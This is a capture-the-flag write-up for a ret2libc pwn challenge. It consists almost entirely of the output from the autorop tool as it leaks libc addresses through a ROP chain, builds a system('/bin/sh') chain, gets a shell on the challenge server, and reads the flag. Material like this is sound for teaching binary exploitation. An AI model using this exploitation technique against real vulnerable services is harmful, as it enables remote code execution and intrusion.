# Access Denied: Pwn/ret2libc

## Question 

Return of libc.

server: nc 107.178.209.165 1337

[ret2libc](ret2libc)

## Solution

Since this was a simple ret2libc vulnerability, I just used ``autorop`` to build a ``ret2libc`` chain, leakd the address of ``libc`` and call ``system(/bin/sh)``

```
$ autorop ./ret2libc 107.178.209.165 1337
[*] '/root/workspace/access_denied/ret2libc/ret2libc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Produced pipeline: Classic(Corefile(), OpenTarget(), Puts(False, ['__libc_start_main', 'puts']), Auto(), SystemBinSh())
[*] Pipeline [1/5]: Corefile()
[+] Starting local process './ret2libc': pid 2167
[*] Process './ret2libc' stopped with exit code -11 (SIGSEGV) (pid 2167)
[+] Receiving all data: Done (1.00KB)
[!] Error parsing corefile stack: Found bad environment at 0x7fff91bfefd4
[+] Parsing corefile...: Done
[*] '/root/workspace/access_denied/ret2libc/core.2167'
    Arch:      amd64-64-little
    RIP:       0x4011d5
    RSP:       0x7fff91bfc988
    Exe:       '/root/workspace/access_denied/ret2libc/ret2libc' (0x400000)
    Fault:     0x6161616161616166
[*] Fault address @ 0x6161616161616166
[*] Offset to return address is 40
[*] Pipeline [2/5]: OpenTarget()
[+] Opening connection to 107.178.209.165 on port 1337: Done
[*] Pipeline [3/5]: Puts(False, ['__libc_start_main', 'puts'])
[+] Opening connection to 107.178.209.165 on port 1337: Done
[*] Loaded 14 cached gadgets for './ret2libc'
[*] 0x0000:         0x40101a ret
    0x0008:         0x401243 pop rdi; ret
    0x0010:         0x403ff0 [arg0] rdi = __libc_start_main
    0x0018:         0x401064 puts
    0x0020:         0x40101a ret
    0x0028:         0x401243 pop rdi; ret
    0x0030:         0x404018 [arg0] rdi = got.puts
    0x0038:         0x401064 puts
    0x0040:         0x40101a ret
    0x0048:         0x401176 main()
[*] leaked __libc_start_main @ 0x7feaddd7cba0
[*] leaked puts @ 0x7feaddddb970
[*] Pipeline [4/5]: Auto()
[*] Searching for libc based on leaks using libc.rip
[!] 2 matching libc's found, picking first one
[*] Downloading libc
[*] '/root/workspace/access_denied/ret2libc/.autorop.libc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Pipeline [5/5]: SystemBinSh()
[*] Loaded 199 cached gadgets for '.autorop.libc'
[*] 0x0000:         0x40101a ret
    0x0008:         0x401243 pop rdi; ret
    0x0010:   0x7feaddf0ed88 [arg0] rdi = 140646722629000
    0x0018:   0x7feadddaa420 system
    0x0020:         0x40101a ret
    0x0028:         0x401176 main()
[*] Switching to interactive mode
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaa\x1a@
$ cat flag.txt
accessdenied{ret2l1bc_15_r34lly_4m4z1ng_3xpl0_75723a21}
```

